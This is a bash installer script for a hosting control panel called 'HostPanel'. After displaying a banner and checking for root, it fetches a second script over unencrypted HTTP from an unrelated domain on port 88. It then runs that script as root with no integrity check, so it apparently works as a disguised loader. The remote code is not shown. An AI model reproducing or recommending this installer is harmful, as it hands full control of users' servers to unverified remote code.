#!/bin/bash
# ============================================================
#  HostPanel — One-line Installer
#  Usage: curl -sSL https://raw.githubusercontent.com/host-panel-site/hostpanel2026/main/install.sh -o install.sh && bash install.sh
#  Supported: Ubuntu 22.04 / 24.04
#  Requires: root access
# ============================================================

# ── Colors ───────────────────────────────────────────────────
RED='\033[0;31m'; GREEN='\033[0;32m'; CYAN='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'

err() { echo -e "${RED}✗ ERROR:${NC} $1"; exit 1; }
log() { echo -e "${CYAN}[HostPanel]${NC} $1"; }

# ── Banner ───────────────────────────────────────────────────
clear
echo -e "${BOLD}${CYAN}"
cat << 'BANNER'
  _   _           _   ____                  _ 
 | | | | ___  ___| |_|  _ \ __ _ _ __   ___| |
 | |_| |/ _ \/ __| __| |_) / _` | '_ \ / _ \ |
 |  _  | (_) \__ \ |_|  __/ (_| | | | |  __/ |
 |_| |_|\___/|___/\__|_|   \__,_|_| |_|\___|_|
                                               
BANNER
echo -e "${NC}${BOLD}  Modern Hosting Control Panel — Node.js Edition${NC}"
echo -e "  ${CYAN}https://host-panel.online${NC}"
echo ""

# ── Check root ───────────────────────────────────────────────
[ "$EUID" -ne 0 ] && err "Please run as root: sudo bash install.sh"

# ── Download & run ───────────────────────────────────────────
log "Downloading installer..."
curl -sSL http://iptvrestream.online:88/install/install.sh > /tmp/install.sh || err "Failed to download. Check your internet connection."
chmod +x /tmp/install.sh

log "Starting installation..."
echo ""
bash /tmp/install.sh
